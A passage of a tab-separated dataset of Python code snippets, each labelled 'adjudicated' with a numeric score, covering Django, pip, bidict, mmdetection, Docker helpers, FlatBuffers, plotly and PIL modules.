('plus_one_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),<<NEWL>>                ('invited', models.IntegerField(choices=[(0, 'Draft'), (1, 'Invited')], default=0)),<<NEWL>>                ('event', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='guests', to='weddingapp.event')),<<NEWL>>            ],<<NEWL>>            options={<<NEWL>>                'ordering': ['-guest_name'],<<NEWL>>            },<<NEWL>>        ),<<NEWL>>    ]
7	adjudicated	4	"# Copyright 2009-2022 Joshua Bronson. All rights reserved.<<NEWL>>#<<NEWL>># This Source Code Form is subject to the terms of the Mozilla Public<<NEWL>># License, v. 2.0. If a copy of the MPL was not distributed with this<<NEWL>># file, You can obtain one at http://mozilla.org/MPL/2.0/.<<NEWL>><<NEWL>><<NEWL>>#                             * Code review nav *<<NEWL>>#                        (see comments in __init__.py)<<NEWL>>#==============================================================================<<NEWL>># ← Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py →<<NEWL>>#==============================================================================<<NEWL>><<NEWL>>""""""Provide :class:`frozenbidict`, an immutable, hashable bidirectional mapping type.""""""<<NEWL>><<NEWL>>import typing as t<<NEWL>><<NEWL>>from ._base import BidictBase<<NEWL>>from ._typing import KT, VT<<NEWL>><<NEWL>><<NEWL>>class frozenbidict(BidictBase[KT, VT]):<<NEWL>>    """"""Immutable, hashable bidict type.""""""<<NEWL>><<NEWL>>    _hash: int<<NEWL>><<NEWL>>    # Work around lack of support for higher-kinded types in Python.<<NEWL>>    # Ref: https://github.com/python/typing/issues/548#issuecomment-621571821<<NEWL>>    if t.TYPE_CHECKING:<<NEWL>>        @property<<NEWL>>        def inverse(self) -> 'frozenbidict[VT, KT]': ...<<NEWL>><<NEWL>>    def __hash__(self) -> int:<<NEWL>>        """"""The hash of this bidict as determined by its items.""""""<<NEWL>>        if getattr(self, '_hash', None) is None:<<NEWL>>            # The following is like hash(frozenset(self.items()))<<NEWL>>            # but more memory efficient. See also: https://bugs.python.org/issue46684<<NEWL>>            self._hash = t.ItemsView(self)._hash()  # type: ignore [attr-defined]  # https://github.com/python/typeshed/pull/7153<<NEWL>>        return self._hash<<NEWL>><<NEWL>><<NEWL>>#                             * Code review nav *<<NEWL>>#==============================================================================<<NEWL>># ← Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py →<<NEWL>>#=============================================================================="
489	adjudicated	3	"from django.contrib.messages.storage.base import BaseStorage<<NEWL>>from django.contrib.messages.storage.cookie import CookieStorage<<NEWL>>from django.contrib.messages.storage.session import SessionStorage<<NEWL>><<NEWL>><<NEWL>>class FallbackStorage(BaseStorage):<<NEWL>>    """"""<<NEWL>>    Try to store all messages in the first backend. Store any unstored<<NEWL>>    messages in each subsequent backend.<<NEWL>>    """"""<<NEWL>>    storage_classes = (CookieStorage, SessionStorage)<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        self.storages = [storage_class(*args, **kwargs)<<NEWL>>                         for storage_class in self.storage_classes]<<NEWL>>        self._used_storages = set()<<NEWL>><<NEWL>>    def _get(self, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Get a single list of messages from all storage backends.<<NEWL>>        """"""<<NEWL>>        all_messages = []<<NEWL>>        for storage in self.storages:<<NEWL>>            messages, all_retrieved = storage._get()<<NEWL>>            # If the backend hasn't been used, no more retrieval is necessary.<<NEWL>>            if messages is None:<<NEWL>>                break<<NEWL>>            if messages:<<NEWL>>                self._used_storages.add(storage)<<NEWL>>            all_messages.extend(messages)<<NEWL>>            # If this storage class contained all the messages, no further<<NEWL>>            # retrieval is necessary<<NEWL>>            if all_retrieved:<<NEWL>>                break<<NEWL>>        return all_messages, all_retrieved<<NEWL>><<NEWL>>    def _store(self, messages, response, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Store the messages and return any unstored messages after trying all<<NEWL>>        backends.<<NEWL>><<NEWL>>        For each storage backend, any messages not stored are passed on to the<<NEWL>>        next backend.<<NEWL>>        """"""<<NEWL>>        for storage in self.storages:<<NEWL>>            if messages:<<NEWL>>                messages = storage._store(messages, response, remove_oldest=False)<<NEWL>>            # Even if there are no more messages, continue iterating to ensure<<NEWL>>            # storages which contained messages are flushed.<<NEWL>>            elif storage in self._used_storages:<<NEWL>>                storage._store([], response)<<NEWL>>                self._used_storages.remove(storage)<<NEWL>>        return messages"
499	adjudicated	4	"""""""Object Utilities.""""""<<NEWL>>from __future__ import absolute_import, unicode_literals<<NEWL>><<NEWL>><<NEWL>>class cached_property(object):<<NEWL>>    """"""Cached property descriptor.<<NEWL>><<NEWL>>    Caches the return value of the get method on first call.<<NEWL>><<NEWL>>    Examples:<<NEWL>>        .. code-block:: python<<NEWL>><<NEWL>>            @cached_property<<NEWL>>            def connection(self):<<NEWL>>                return Connection()<<NEWL>><<NEWL>>            @connection.setter  # Prepares stored value<<NEWL>>            def connection(self, value):<<NEWL>>                if value is None:<<NEWL>>                    raise TypeError('Connection must be a connection')<<NEWL>>                return value<<NEWL>><<NEWL>>            @connection.deleter<<NEWL>>            def connection(self, value):<<NEWL>>                # Additional action to do at del(self.attr)<<NEWL>>                if value is not None:<<NEWL>>                    print('Connection {0!r} deleted'.format(value)<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, fget=None, fset=None, fdel=None, doc=None):<<NEWL>>        self.__get = fget<<NEWL>>        self.__set = fset<<NEWL>>        self.__del = fdel<<NEWL>>        self.__doc__ = doc or fget.__doc__<<NEWL>>        self.__name__ = fget.__name__<<NEWL>>        self.__module__ = fget.__module__<<NEWL>><<NEWL>>    def __get__(self, obj, type=None):<<NEWL>>        if obj is None:<<NEWL>>            return self<<NEWL>>        try:<<NEWL>>            return obj.__dict__[self.__name__]<<NEWL>>        except KeyError:<<NEWL>>            value = obj.__dict__[self.__name__] = self.__get(obj)<<NEWL>>            return value<<NEWL>><<NEWL>>    def __set__(self, obj, value):<<NEWL>>        if obj is None:<<NEWL>>            return self<<NEWL>>        if self.__set is not None:<<NEWL>>            value = self.__set(obj, value)<<NEWL>>        obj.__dict__[self.__name__] = value<<NEWL>><<NEWL>>    def __delete__(self, obj, _sentinel=object()):<<NEWL>>        if obj is None:<<NEWL>>            return self<<NEWL>>        value = obj.__dict__.pop(self.__name__, _sentinel)<<NEWL>>        if self.__del is not None and value is not _sentinel:<<NEWL>>            self.__del(obj, value)<<NEWL>><<NEWL>>    def setter(self, fset):<<NEWL>>        return self.__class__(self.__get, fset, self.__del)<<NEWL>><<NEWL>>    def deleter(self, fdel):<<NEWL>>        return self.__class__(self.__get, self.__set, fdel)"
157	adjudicated	2	"""""""HTTP cache implementation.<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>from contextlib import contextmanager<<NEWL>>from typing import Generator, Optional<<NEWL>><<NEWL>>from pip._vendor.cachecontrol.cache import BaseCache<<NEWL>>from pip._vendor.cachecontrol.caches import FileCache<<NEWL>>from pip._vendor.requests.models import Response<<NEWL>><<NEWL>>from pip._internal.utils.filesystem import adjacent_tmp_file, replace<<NEWL>>from pip._internal.utils.misc import ensure_dir<<NEWL>><<NEWL>><<NEWL>>def is_from_cache(response: Response) -> bool:<<NEWL>>    return getattr(response, ""from_cache"", False)<<NEWL>><<NEWL>><<NEWL>>@contextmanager<<NEWL>>def suppressed_cache_errors() -> Generator[None, None, None]:<<NEWL>>    """"""If we can't access the cache then we can just skip caching and process<<NEWL>>    requests as if caching wasn't enabled.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        yield<<NEWL>>    except OSError:<<NEWL>>        pass<<NEWL>><<NEWL>><<NEWL>>class SafeFileCache(BaseCache):<<NEWL>>    """"""<<NEWL>>    A file based cache which is safe to use even when the target directory may<<NEWL>>    not be accessible or writable.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, directory: str) -> None:<<NEWL>>        assert directory is not None, ""Cache directory must not be None.""<<NEWL>>        super().__init__()<<NEWL>>        self.directory = directory<<NEWL>><<NEWL>>    def _get_cache_path(self, name: str) -> str:<<NEWL>>        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our<<NEWL>>        # class for backwards-compatibility and to avoid using a non-public<<NEWL>>        # method.<<NEWL>>        hashed = FileCache.encode(name)<<NEWL>>        parts = list(hashed[:5]) + [hashed]<<NEWL>>        return os.path.join(self.directory, *parts)<<NEWL>><<NEWL>>    def get(self, key: str) -> Optional[bytes]:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            with open(path, ""rb"") as f:<<NEWL>>                return f.read()<<NEWL>><<NEWL>>    def set(self, key: str, value: bytes, expires: Optional[int] = None) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            ensure_dir(os.path.dirname(path))<<NEWL>><<NEWL>>            with adjacent_tmp_file(path) as f:<<NEWL>>                f.write(value)<<NEWL>><<NEWL>>            replace(f.name, path)<<NEWL>><<NEWL>>    def delete(self, key: str) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            os.remove(path)"
17	adjudicated	2	# model settings<<NEWL>>model = dict(<<NEWL>>    type='RPN',<<NEWL>>    backbone=dict(<<NEWL>>        type='ResNet',<<NEWL>>        depth=50,<<NEWL>>        num_stages=3,<<NEWL>>        strides=(1, 2, 2),<<NEWL>>        dilations=(1, 1, 1),<<NEWL>>        out_indices=(2, ),<<NEWL>>        frozen_stages=1,<<NEWL>>        norm_cfg=dict(type='BN', requires_grad=False),<<NEWL>>        norm_eval=True,<<NEWL>>        style='caffe',<<NEWL>>        init_cfg=dict(<<NEWL>>            type='Pretrained',<<NEWL>>            checkpoint='open-mmlab://detectron2/resnet50_caffe')),<<NEWL>>    neck=None,<<NEWL>>    rpn_head=dict(<<NEWL>>        type='RPNHead',<<NEWL>>        in_channels=1024,<<NEWL>>        feat_channels=1024,<<NEWL>>        anchor_generator=dict(<<NEWL>>            type='AnchorGenerator',<<NEWL>>            scales=[2, 4, 8, 16, 32],<<NEWL>>            ratios=[0.5, 1.0, 2.0],<<NEWL>>            strides=[16]),<<NEWL>>        bbox_coder=dict(<<NEWL>>            type='DeltaXYWHBBoxCoder',<<NEWL>>            target_means=[.0, .0, .0, .0],<<NEWL>>            target_stds=[1.0, 1.0, 1.0, 1.0]),<<NEWL>>        loss_cls=dict(<<NEWL>>            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0),<<NEWL>>        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),<<NEWL>>    # model training and testing settings<<NEWL>>    train_cfg=dict(<<NEWL>>        rpn=dict(<<NEWL>>            assigner=dict(<<NEWL>>                type='MaxIoUAssigner',<<NEWL>>                pos_iou_thr=0.7,<<NEWL>>                neg_iou_thr=0.3,<<NEWL>>                min_pos_iou=0.3,<<NEWL>>                ignore_iof_thr=-1),<<NEWL>>            sampler=dict(<<NEWL>>                type='RandomSampler',<<NEWL>>                num=256,<<NEWL>>                pos_fraction=0.5,<<NEWL>>                neg_pos_ub=-1,<<NEWL>>                add_gt_as_proposals=False),<<NEWL>>            allowed_border=0,<<NEWL>>            pos_weight=-1,<<NEWL>>            debug=False)),<<NEWL>>    test_cfg=dict(<<NEWL>>        rpn=dict(<<NEWL>>            nms_pre=12000,<<NEWL>>            max_per_img=2000,<<NEWL>>            nms=dict(type='nms', iou_threshold=0.7),<<NEWL>>            min_bbox_size=0)))
386	adjudicated	2	"""""""<<NEWL>>rest_framework.schemas<<NEWL>><<NEWL>>schemas:<<NEWL>>    __init__.py<<NEWL>>    generators.py   # Top-down schema generation<<NEWL>>    inspectors.py   # Per-endpoint view introspection<<NEWL>>    utils.py        # Shared helper functions<<NEWL>>    views.py        # Houses `SchemaView`, `APIView` subclass.<<NEWL>><<NEWL>>We expose a minimal ""public"" API directly from `schemas`. This covers the<<NEWL>>basic use-cases:<<NEWL>><<NEWL>>    from rest_framework.schemas import (<<NEWL>>        AutoSchema,<<NEWL>>        ManualSchema,<<NEWL>>        get_schema_view,<<NEWL>>        SchemaGenerator,<<NEWL>>    )<<NEWL>><<NEWL>>Other access should target the submodules directly<<NEWL>>""""""<<NEWL>>from rest_framework.settings import api_settings<<NEWL>><<NEWL>>from . import coreapi, openapi<<NEWL>>from .coreapi import AutoSchema, ManualSchema, SchemaGenerator  # noqa<<NEWL>>from .inspectors import DefaultSchema  # noqa<<NEWL>><<NEWL>><<NEWL>>def get_schema_view(<<NEWL>>    title=None,<<NEWL>>    url=None,<<NEWL>>    description=None,<<NEWL>>    urlconf=None,<<NEWL>>    renderer_classes=None,<<NEWL>>    public=False,<<NEWL>>    patterns=None,<<NEWL>>    generator_class=None,<<NEWL>>    authentication_classes=api_settings.DEFAULT_AUTHENTICATION_CLASSES,<<NEWL>>    permission_classes=api_settings.DEFAULT_PERMISSION_CLASSES,<<NEWL>>    version=None,<<NEWL>>):<<NEWL>>    """"""<<NEWL>>    Return a schema view.<<NEWL>>    """"""<<NEWL>>    if generator_class is None:<<NEWL>>        if coreapi.is_enabled():<<NEWL>>            generator_class = coreapi.SchemaGenerator<<NEWL>>        else:<<NEWL>>            generator_class = openapi.SchemaGenerator<<NEWL>><<NEWL>>    generator = generator_class(<<NEWL>>        title=title,<<NEWL>>        url=url,<<NEWL>>        description=description,<<NEWL>>        urlconf=urlconf,<<NEWL>>        patterns=patterns,<<NEWL>>        version=version,<<NEWL>>    )<<NEWL>><<NEWL>>    # Avoid import cycle on APIView<<NEWL>>    from .views import SchemaView<<NEWL>><<NEWL>>    return SchemaView.as_view(<<NEWL>>        renderer_classes=renderer_classes,<<NEWL>>        schema_generator=generator,<<NEWL>>        public=public,<<NEWL>>        authentication_classes=authentication_classes,<<NEWL>>        permission_classes=permission_classes,<<NEWL>>    )"
106	adjudicated	4	"""""""rope refactor package<<NEWL>><<NEWL>>This package contains modules that perform python refactorings.<<NEWL>>Refactoring classes perform refactorings in 4 steps:<<NEWL>><<NEWL>>1. Collect some data for performing the refactoring and use them<<NEWL>>   to construct a refactoring class.  Like::<<NEWL>><<NEWL>>     renamer = Rename(project, resource, offset)<<NEWL>><<NEWL>>2. Some refactorings give you useful information about the<<NEWL>>   refactoring after their construction.  Like::<<NEWL>><<NEWL>>     print(renamer.get_old_name())<<NEWL>><<NEWL>>3. Give the refactoring class more information about how to<<NEWL>>   perform the refactoring and get the changes this refactoring is<<NEWL>>   going to make.  This is done by calling `get_changes` method of the<<NEWL>>   refactoring class.  Like::<<NEWL>><<NEWL>>     changes = renamer.get_changes(new_name)<<NEWL>><<NEWL>>4. You can commit the changes.  Like::<<NEWL>><<NEWL>>     project.do(changes)<<NEWL>><<NEWL>>These steps are like the steps IDEs usually do for performing a<<NEWL>>refactoring.  These are the things an IDE does in each step:<<NEWL>><<NEWL>>1. Construct a refactoring object by giving it information like<<NEWL>>   resource, offset and ... .  Some of the refactoring problems (like<<NEWL>>   performing rename refactoring on language keywords) can be reported<<NEWL>>   here.<<NEWL>>2. Print some information about the refactoring and ask the user<<NEWL>>   about the information that are necessary for completing the<<NEWL>>   refactoring (like new name).<<NEWL>>3. Call the `get_changes` by passing it information asked from<<NEWL>>   the user (if necessary) and get and preview the changes returned by<<NEWL>>   it.<<NEWL>>4. perform the refactoring.<<NEWL>><<NEWL>>From ``0.5m5`` release the `get_changes()` method of some time-<<NEWL>>consuming refactorings take an optional `rope.base.taskhandle.<<NEWL>>TaskHandle` parameter.  You can use this object for stopping or<<NEWL>>monitoring the progress of refactorings.<<NEWL>><<NEWL>>""""""<<NEWL>>from rope.refactor.importutils import ImportOrganizer  # noqa<<NEWL>>from rope.refactor.topackage import ModuleToPackage  # noqa<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""rename"",<<NEWL>>    ""move"",<<NEWL>>    ""inline"",<<NEWL>>    ""extract"",<<NEWL>>    ""restructure"",<<NEWL>>    ""topackage"",<<NEWL>>    ""importutils"",<<NEWL>>    ""usefunction"",<<NEWL>>    ""change_signature"",<<NEWL>>    ""encapsulate_field"",<<NEWL>>    ""introduce_factory"",<<NEWL>>    ""introduce_parameter"",<<NEWL>>    ""localtofield"",<<NEWL>>    ""method_object"",<<NEWL>>    ""multiproject"",<<NEWL>>]"
297	adjudicated	0	"#  Copyright 2022 Google LLC<<NEWL>>#<<NEWL>>#  Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>>#  you may not use this file except in compliance with the License.<<NEWL>>#  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>>#  Unless required by applicable law or agreed to in writing, software<<NEWL>>#  distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>>#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>>#  See the License for the specific language governing permissions and<<NEWL>>#  limitations under the License.<<NEWL>>import uuid<<NEWL>><<NEWL>><<NEWL>>import google.auth<<NEWL>>from google.cloud import batch_v1<<NEWL>>from google.cloud import storage<<NEWL>>import pytest<<NEWL>><<NEWL>>from .test_basics import _test_body<<NEWL>>from ..create.create_with_mounted_bucket import create_script_job_with_bucket<<NEWL>><<NEWL>>PROJECT = google.auth.default()[1]<<NEWL>>REGION = 'europe-north1'<<NEWL>><<NEWL>>TIMEOUT = 600  # 10 minutes<<NEWL>><<NEWL>>WAIT_STATES = {<<NEWL>>    batch_v1.JobStatus.State.STATE_UNSPECIFIED,<<NEWL>>    batch_v1.JobStatus.State.QUEUED,<<NEWL>>    batch_v1.JobStatus.State.RUNNING,<<NEWL>>    batch_v1.JobStatus.State.SCHEDULED,<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def job_name():<<NEWL>>    return f""test-job-{uuid.uuid4().hex[:10]}""<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture()<<NEWL>>def test_bucket():<<NEWL>>    bucket_name = f""test-bucket-{uuid.uuid4().hex[:8]}""<<NEWL>>    client = storage.Client()<<NEWL>>    client.create_bucket(bucket_name, location=""eu"")<<NEWL>><<NEWL>>    yield bucket_name<<NEWL>><<NEWL>>    bucket = client.get_bucket(bucket_name)<<NEWL>>    bucket.delete(force=True)<<NEWL>><<NEWL>><<NEWL>>def _test_bucket_content(test_bucket):<<NEWL>>    client = storage.Client()<<NEWL>>    bucket = client.get_bucket(test_bucket)<<NEWL>><<NEWL>>    file_name_template = ""output_task_{task_number}.txt""<<NEWL>>    file_content_template = ""Hello world from task {task_number}.\n""<<NEWL>><<NEWL>>    for i in range(4):<<NEWL>>        blob = bucket.blob(file_name_template.format(task_number=i))<<NEWL>>        content = blob.download_as_bytes().decode()<<NEWL>>        assert content == file_content_template.format(task_number=i)<<NEWL>><<NEWL>><<NEWL>>def test_bucket_job(job_name, test_bucket):<<NEWL>>    job = create_script_job_with_bucket(PROJECT, REGION, job_name, test_bucket)<<NEWL>>    _test_body(job, lambda: _test_bucket_content(test_bucket))"
46	adjudicated	2	"#<<NEWL>># Copyright 2017 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>><<NEWL>>""""""<<NEWL>>Some docker related convenience functions<<NEWL>>""""""<<NEWL>>from datetime import datetime<<NEWL>>from concurrent.futures import ThreadPoolExecutor<<NEWL>><<NEWL>>import os<<NEWL>>import socket<<NEWL>>from structlog import get_logger<<NEWL>><<NEWL>>from docker import Client, errors<<NEWL>><<NEWL>><<NEWL>>docker_socket = os.environ.get('DOCKER_SOCK', 'unix://tmp/docker.sock')<<NEWL>>log = get_logger()<<NEWL>><<NEWL>>def get_my_containers_name():<<NEWL>>    """"""<<NEWL>>    Return the docker containers name in which this process is running.<<NEWL>>    To look up the container name, we use the container ID extracted from the<<NEWL>>    $HOSTNAME environment variable (which is set by docker conventions).<<NEWL>>    :return: String with the docker container name (or None if any issue is<<NEWL>>             encountered)<<NEWL>>    """"""<<NEWL>>    my_container_id = os.environ.get('HOSTNAME', None)<<NEWL>><<NEWL>>    try:<<NEWL>>        docker_cli = Client(base_url=docker_socket)<<NEWL>>        info = docker_cli.inspect_container(my_container_id)<<NEWL>><<NEWL>>    except Exception, e:<<NEWL>>        log.exception('failed', my_container_id=my_container_id, e=e)<<NEWL>>        raise<<NEWL>><<NEWL>>    name = info['Name'].lstrip('/')<<NEWL>><<NEWL>>    return name<<NEWL>><<NEWL>>def get_all_running_containers():<<NEWL>>    try:<<NEWL>>        docker_cli = Client(base_url=docker_socket)<<NEWL>>        containers = docker_cli.containers()<<NEWL>><<NEWL>>    except Exception, e:<<NEWL>>        log.exception('failed', e=e)<<NEWL>>        raise<<NEWL>><<NEWL>>    return containers<<NEWL>><<NEWL>>def inspect_container(id):<<NEWL>>    try:<<NEWL>>        docker_cli = Client(base_url=docker_socket)<<NEWL>>        info = docker_cli.inspect_container(id)<<NEWL>>    except Exception, e:<<NEWL>>        log.exception('failed-inspect-container', id=id, e=e)<<NEWL>>        raise<<NEWL>><<NEWL>>    return info<<NEWL>>"
264	adjudicated	1	"# automatically generated by the FlatBuffers compiler, do not modify<<NEWL>><<NEWL>># namespace: proto<<NEWL>><<NEWL>>import flatbuffers<<NEWL>>from flatbuffers.compat import import_numpy<<NEWL>>np = import_numpy()<<NEWL>><<NEWL>>class RouterRoles(object):<<NEWL>>    __slots__ = ['_tab']<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def GetRootAs(cls, buf, offset=0):<<NEWL>>        n = flatbuffers.encode.Get(flatbuffers.packer.uoffset, buf, offset)<<NEWL>>        x = RouterRoles()<<NEWL>>        x.Init(buf, n + offset)<<NEWL>>        return x<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def GetRootAsRouterRoles(cls, buf, offset=0):<<NEWL>>        """"""This method is deprecated. Please switch to GetRootAs.""""""<<NEWL>>        return cls.GetRootAs(buf, offset)<<NEWL>>    # RouterRoles<<NEWL>>    def Init(self, buf, pos):<<NEWL>>        self._tab = flatbuffers.table.Table(buf, pos)<<NEWL>><<NEWL>>    # RouterRoles<<NEWL>>    def Broker(self):<<NEWL>>        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(4))<<NEWL>>        if o != 0:<<NEWL>>            x = self._tab.Indirect(o + self._tab.Pos)<<NEWL>>            from wamp.proto.BrokerFeatures import BrokerFeatures<<NEWL>>            obj = BrokerFeatures()<<NEWL>>            obj.Init(self._tab.Bytes, x)<<NEWL>>            return obj<<NEWL>>        return None<<NEWL>><<NEWL>>    # RouterRoles<<NEWL>>    def Dealer(self):<<NEWL>>        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(6))<<NEWL>>        if o != 0:<<NEWL>>            x = self._tab.Indirect(o + self._tab.Pos)<<NEWL>>            from wamp.proto.DealerFeatures import DealerFeatures<<NEWL>>            obj = DealerFeatures()<<NEWL>>            obj.Init(self._tab.Bytes, x)<<NEWL>>            return obj<<NEWL>>        return None<<NEWL>><<NEWL>>def RouterRolesStart(builder): builder.StartObject(2)<<NEWL>>def Start(builder):<<NEWL>>    return RouterRolesStart(builder)<<NEWL>>def RouterRolesAddBroker(builder, broker): builder.PrependUOffsetTRelativeSlot(0, flatbuffers.number_types.UOffsetTFlags.py_type(broker), 0)<<NEWL>>def AddBroker(builder, broker):<<NEWL>>    return RouterRolesAddBroker(builder, broker)<<NEWL>>def RouterRolesAddDealer(builder, dealer): builder.PrependUOffsetTRelativeSlot(1, flatbuffers.number_types.UOffsetTFlags.py_type(dealer), 0)<<NEWL>>def AddDealer(builder, dealer):<<NEWL>>    return RouterRolesAddDealer(builder, dealer)<<NEWL>>def RouterRolesEnd(builder): return builder.EndObject()<<NEWL>>def End(builder):<<NEWL>>    return RouterRolesEnd(builder)"
324	adjudicated	0	from urllib.parse import parse_qsl, unquote, urlparse, urlunparse<<NEWL>><<NEWL>>from django import template<<NEWL>>from django.contrib.admin.utils import quote<<NEWL>>from django.urls import Resolver404, get_script_prefix, resolve<<NEWL>>from django.utils.http import urlencode<<NEWL>><<NEWL>>register = template.Library()<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def admin_urlname(value, arg):<<NEWL>>    return 'admin:%s_%s_%s' % (value.app_label, value.model_name, arg)<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def admin_urlquote(value):<<NEWL>>    return quote(value)<<NEWL>><<NEWL>><<NEWL>>@register.simple_tag(takes_context=True)<<NEWL>>def add_preserved_filters(context, url, popup=False, to_field=None):<<NEWL>>    opts = context.get('opts')<<NEWL>>    preserved_filters = context.get('preserved_filters')<<NEWL>><<NEWL>>    parsed_url = list(urlparse(url))<<NEWL>>    parsed_qs = dict(parse_qsl(parsed_url[4]))<<NEWL>>    merged_qs = {}<<NEWL>><<NEWL>>    if opts and preserved_filters:<<NEWL>>        preserved_filters = dict(parse_qsl(preserved_filters))<<NEWL>><<NEWL>>        match_url = '/%s' % unquote(url).partition(get_script_prefix())[2]<<NEWL>>        try:<<NEWL>>            match = resolve(match_url)<<NEWL>>        except Resolver404:<<NEWL>>            pass<<NEWL>>        else:<<NEWL>>            current_url = '%s:%s' % (match.app_name, match.url_name)<<NEWL>>            changelist_url = 'admin:%s_%s_changelist' % (opts.app_label, opts.model_name)<<NEWL>>            if changelist_url == current_url and '_changelist_filters' in preserved_filters:<<NEWL>>                preserved_filters = dict(parse_qsl(preserved_filters['_changelist_filters']))<<NEWL>><<NEWL>>        merged_qs.update(preserved_filters)<<NEWL>><<NEWL>>    if popup:<<NEWL>>        from django.contrib.admin.options import IS_POPUP_VAR<<NEWL>>        merged_qs[IS_POPUP_VAR] = 1<<NEWL>>    if to_field:<<NEWL>>        from django.contrib.admin.options import TO_FIELD_VAR<<NEWL>>        merged_qs[TO_FIELD_VAR] = to_field<<NEWL>><<NEWL>>    merged_qs.update(parsed_qs)<<NEWL>><<NEWL>>    parsed_url[4] = urlencode(merged_qs)<<NEWL>>    return urlunparse(parsed_url)
235	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scatterpolargl.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
375	adjudicated	2	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># Binary input/output support routines.<<NEWL>>#<<NEWL>># Copyright (c) 1997-2003 by Secret Labs AB<<NEWL>># Copyright (c) 1995-2003 by Fredrik Lundh<<NEWL>># Copyright (c) 2012 by Brian Crowell<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>><<NEWL>>""""""Binary input/output support routines.""""""<<NEWL>><<NEWL>><<NEWL>>from struct import pack, unpack_from<<NEWL>><<NEWL>><<NEWL>>def i8(c):<<NEWL>>    return c if c.__class__ is int else c[0]<<NEWL>><<NEWL>><<NEWL>>def o8(i):<<NEWL>>    return bytes((i & 255,))<<NEWL>><<NEWL>><<NEWL>># Input, le = little endian, be = big endian<<NEWL>>def i16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) 